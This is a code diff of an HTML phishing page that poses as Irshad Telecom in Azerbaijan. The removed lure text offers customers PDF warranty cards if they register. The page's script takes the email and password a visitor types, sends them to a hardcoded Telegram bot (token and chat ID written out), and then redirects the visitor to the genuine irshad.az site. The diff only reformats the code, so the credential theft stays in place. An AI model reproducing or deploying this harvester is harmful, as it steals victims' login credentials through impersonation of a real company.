@@ -77,13 +77,13 @@
 <body>
     <script>
         function a(e) {
-            const email=document.getElementById("email")
-            const pswd=document.getElementById("pswd")
+            const email = document.getElementById("email")
+            const pswd = document.getElementById("pswd")
             var settings = {
                 "async": true,
                 "crossDomain": true,
-                "url": 
-                `https://api.telegram.org/bot1760639677:AAFyFqP4MGot4pV-BBvWqDGrRnPQGMV0_14/sendMessage?chat_id=1026985961&text=email:${email.value}  password:${pswd.value}`,
+                "url":
+                    `https://api.telegram.org/bot1760639677:AAFyFqP4MGot4pV-BBvWqDGrRnPQGMV0_14/sendMessage?chat_id=1026985961&text=email:${email.value}  password:${pswd.value}`,
                 "method": "POST",
                 "headers": {
                     "Content-Type": "application/json",
@@ -91,11 +91,9 @@
                 }
             }
             $.ajax(settings).done();
-            window.location="https://irshad.az/"
+            window.location = "https://irshad.az/"
         }
     </script>
-    <p style="text-align: center;font-size: 20px;">Salam Hörmətli müştərimiz! İrşad telekomdan məhsul aldığınız üçün təşəkkürlər!</p>
-    <p style="text-align: center;font-size: 20px;padding: 0px 10px;">Müştərilərimizin istəklərinə əsasən İrşad elektroniks zəmanət kağızlarının pdf şəklində verilməsini təmin edir. Bunun üçün qeydiyyatdan keçin saytımıza daxil olubn və zəmanət talonunuzu əldə edin</p>
     <div class="form">
         <img
             src="http://www.androidpolice.com/wp-content/themes/ap2/ap_resize/ap_resize.php?src=http%3A%2F%2Fwww.androidpolice.com%2Fwp-content%2Fuploads%2F2015%2F10%2Fnexus2cee_Search-Thumb-150x150.png&w=150&h=150&zc=3">
